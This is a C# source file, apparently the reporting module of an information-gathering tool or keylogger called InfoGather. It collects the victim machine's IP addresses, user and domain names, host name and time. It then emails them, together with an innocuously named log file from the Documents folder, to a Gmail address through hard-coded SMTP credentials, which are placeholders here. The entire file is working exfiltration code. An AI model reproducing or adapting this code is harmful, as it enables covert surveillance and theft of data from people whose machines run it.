using System;
using System.Net;
using System.Net.Mail;
using System.Net.Mime;

namespace InfoGather
{
    class SMTP
    {
        public static void SendNewMessage()
        {

            string logContents = "";
            string emailBody = "";

            DateTime now = DateTime.Now;
            string subject = "New InfoGather report Available";

            string filepathe = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string path = (filepathe + @"\localUpdater_new.txt");
            string file = path;

            var host = System.Net.Dns.GetHostEntry(Dns.GetHostName());

            foreach (var address in host.AddressList)
            {
                emailBody += "Address: " + address;
            }
            emailBody += "\nUser: " + Environment.UserDomainName + " \\ " + Environment.UserName;
            emailBody += "\nHost: " + host;
            emailBody += "\nTime: " + now.ToString();
            emailBody += logContents;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage mailMessage = new MailMessage
            {
                From = new MailAddress("[FROM_THIS_EMAIL_ADRES]@gmail.com")
            };
            mailMessage.To.Add("[TO_THIS_EMAIL_ADRES]@gmail.com");
            mailMessage.Subject = subject;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("[FROM_THIS_EMAIL_ADRES]@gmail.com", "[FROM_THIS_EMAIL_ADRES_PASSWORD]");
            mailMessage.Body = emailBody;

            // Create  the file attachment for this email message.
            Attachment data = new Attachment(file, MediaTypeNames.Application.Octet);

            // Add time stamp information for the file.
            ContentDisposition disposition = data.ContentDisposition;
            disposition.CreationDate = System.IO.File.GetCreationTime(file);
            disposition.ModificationDate = System.IO.File.GetLastWriteTime(file);
            disposition.ReadDate = System.IO.File.GetLastAccessTime(file);

            // Add the file attachment to this email message.
            mailMessage.Attachments.Add(data);

            client.Send(mailMessage);
        }
    }
}
